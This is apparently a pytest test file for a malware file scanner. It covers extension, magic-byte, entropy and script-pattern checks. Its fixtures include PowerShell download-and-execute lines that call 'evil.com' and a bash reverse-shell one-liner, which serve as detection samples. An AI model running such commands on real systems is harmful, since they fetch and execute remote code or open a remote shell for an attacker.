# Codes By Visionnn

import os
import struct
import tempfile
from pathlib import Path

import pytest

from security import (
    check_extension,
    check_magic_bytes,
    check_entropy,
    check_script_patterns,
    scan_file,
)


def _make_temp_file(content: bytes, suffix: str = ".txt") -> Path:
    """Create a temporary file with given content and return its path."""
    fd, path = tempfile.mkstemp(suffix=suffix)
    with os.fdopen(fd, "wb") as f:
        f.write(content)
    return Path(path)


class TestCheckExtension:
    def test_safe_txt(self):
        p = Path("document.txt")
        is_safe, _ = check_extension(p)
        assert is_safe is True

    def test_safe_pdf(self):
        p = Path("report.pdf")
        is_safe, _ = check_extension(p)
        assert is_safe is True

    def test_dangerous_exe(self):
        p = Path("malware.exe")
        is_safe, reason = check_extension(p)
        assert is_safe is False
        assert ".exe" in reason

    def test_dangerous_bat(self):
        p = Path("script.bat")
        is_safe, _ = check_extension(p)
        assert is_safe is False

    def test_dangerous_ps1(self):
        p = Path("payload.ps1")
        is_safe, _ = check_extension(p)
        assert is_safe is False

    def test_dangerous_sh(self):
        p = Path("install.sh")
        is_safe, _ = check_extension(p)
        assert is_safe is False

    def test_dangerous_dll(self):
        p = Path("library.dll")
        is_safe, _ = check_extension(p)
        assert is_safe is False

    def test_case_insensitive(self):
        p = Path("VIRUS.EXE")
        is_safe, _ = check_extension(p)
        assert is_safe is False


class TestCheckMagicBytes:
    def test_safe_text_file(self):
        p = _make_temp_file(b"Hello, world! This is a plain text file.")
        try:
            is_safe, _ = check_magic_bytes(p)
            assert is_safe is True
        finally:
            p.unlink()

    def test_mz_header_detected(self):
        """Windows PE executable starts with MZ."""
        p = _make_temp_file(b"MZ\x90\x00" + b"\x00" * 100)
        try:
            is_safe, reason = check_magic_bytes(p)
            assert is_safe is False
            assert "MZ" in reason or "PE" in reason or "executable" in reason.lower()
        finally:
            p.unlink()

    def test_elf_header_detected(self):
        """Linux ELF binary starts with \x7fELF."""
        p = _make_temp_file(b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 50)
        try:
            is_safe, reason = check_magic_bytes(p)
            assert is_safe is False
            assert "ELF" in reason
        finally:
            p.unlink()

    def test_shebang_detected(self):
        """Unix shebang scripts start with #!."""
        p = _make_temp_file(b"#!/bin/bash\necho hello\n")
        try:
            is_safe, reason = check_magic_bytes(p)
            assert is_safe is False
            assert "shebang" in reason.lower()
        finally:
            p.unlink()

    def test_zip_detected(self):
        """ZIP files start with PK\x03\x04."""
        p = _make_temp_file(b"PK\x03\x04" + b"\x00" * 50)
        try:
            is_safe, reason = check_magic_bytes(p)
            assert is_safe is False
        finally:
            p.unlink()


class TestCheckEntropy:
    def test_low_entropy_text(self):
        """Normal text has low entropy."""
        content = b"The quick brown fox jumps over the lazy dog. " * 200
        p = _make_temp_file(content)
        try:
            is_safe, _ = check_entropy(p)
            assert is_safe is True
        finally:
            p.unlink()

    def test_high_entropy_random(self):
        """Random bytes have very high entropy (close to 8.0)."""
        import secrets
        content = secrets.token_bytes(65536)
        p = _make_temp_file(content)
        try:
            is_safe, reason = check_entropy(p)
            assert is_safe is False
            assert "entropy" in reason.lower()
        finally:
            p.unlink()

    def test_small_file_skipped(self):
        """Files < 512 bytes skip entropy check."""
        p = _make_temp_file(b"\xff" * 100)
        try:
            is_safe, _ = check_entropy(p)
            assert is_safe is True  # Too small to check
        finally:
            p.unlink()


class TestCheckScriptPatterns:
    def test_safe_content(self):
        content = b"This is a normal document with no suspicious content."
        p = _make_temp_file(content)
        try:
            is_safe, _ = check_script_patterns(p)
            assert is_safe is True
        finally:
            p.unlink()

    def test_powershell_download_cradle(self):
        content = b"$client = New-Object Net.WebClient\n$client.DownloadString('http://evil.com/payload')"
        p = _make_temp_file(content)
        try:
            is_safe, reason = check_script_patterns(p)
            assert is_safe is False
        finally:
            p.unlink()

    def test_invoke_expression(self):
        content = b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')"
        p = _make_temp_file(content)
        try:
            is_safe, reason = check_script_patterns(p)
            assert is_safe is False
        finally:
            p.unlink()

    def test_reverse_shell(self):
        content = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        p = _make_temp_file(content)
        try:
            is_safe, reason = check_script_patterns(p)
            assert is_safe is False
        finally:
            p.unlink()


class TestScanFile:
    def test_safe_file_passes_all(self):
        content = b"Hello, this is a safe document.\n" * 50
        p = _make_temp_file(content, suffix=".txt")
        try:
            is_safe, reason = scan_file(p)
            assert is_safe is True
            assert reason == ""
        finally:
            p.unlink()

    def test_exe_extension_blocked(self):
        content = b"Hello world"
        p = _make_temp_file(content, suffix=".exe")
        try:
            is_safe, reason = scan_file(p)
            assert is_safe is False
        finally:
            p.unlink()

    def test_mz_header_blocked(self):
        content = b"MZ\x90\x00" + b"\x00" * 200
        p = _make_temp_file(content, suffix=".dat")
        try:
            is_safe, reason = scan_file(p)
            assert is_safe is False
        finally:
            p.unlink()

